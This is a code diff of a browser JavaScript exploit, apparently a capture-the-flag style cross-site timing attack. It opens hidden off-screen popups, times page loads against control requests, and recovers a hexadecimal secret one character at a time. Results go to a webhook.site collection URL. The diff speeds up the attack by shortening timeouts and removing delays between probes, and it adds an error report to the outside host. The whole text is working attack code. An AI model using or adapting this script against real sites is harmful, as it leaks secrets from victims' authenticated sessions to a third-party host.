@@ -23,9 +23,9 @@ const WEBHOOK = "https://webhook.site/5a71a1f0-201a-455f-8ca1-02f890c6f5e9";
 const DEBUG_REDIRECT = false;
 const CHARS = "0123456789abcdef";
 
-const PROBE_TIMEOUT_MS = 420;
-const BETWEEN_PROBES_MS = 25;
-const CAL_SAMPLES = 4;
+const PROBE_TIMEOUT_MS = 220;
+const BETWEEN_PROBES_MS = 0;
+const CAL_SAMPLES = 2;
 
 const $ = (id) => document.getElementById(id);
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
@@ -83,6 +83,7 @@ async function probePrefix(prefix) {
 
         const w = window.open(url, "p" + Math.random(), "width=1,height=1,left=-9999,top=-9999");
         if (!w) {
+            report("ERR:popup_blocked");
             finish("popup_blocked");
             return;
         }
@@ -114,13 +115,11 @@ async function calibrate() {
     for (let i = 0; i < CAL_SAMPLES; i++) {
         const r200 = await probePrefix("");
         t200.push(r200.time);
-        await sleep(BETWEEN_PROBES_MS);
     }
 
     for (let i = 0; i < CAL_SAMPLES; i++) {
         const r404 = await probePrefix(make404Sample("c" + i));
         t404.push(r404.time);
-        await sleep(BETWEEN_PROBES_MS);
     }
 
     const m200 = median(t200);
@@ -145,12 +144,10 @@ async function findSecret(matchFaster) {
         const results = [];
         for (const c of CHARS) {
             const tCandidate = await probePrefix(secret + c);
-            await sleep(BETWEEN_PROBES_MS);
             const tControl = await probePrefix(make404Sample("p" + pos + c));
 
             const delta = tCandidate.time - tControl.time;
             results.push({ c, tc: tCandidate.time, t0: tControl.time, d: delta });
-            await sleep(BETWEEN_PROBES_MS);
         }
 
         results.sort((a, b) => a.d - b.d);
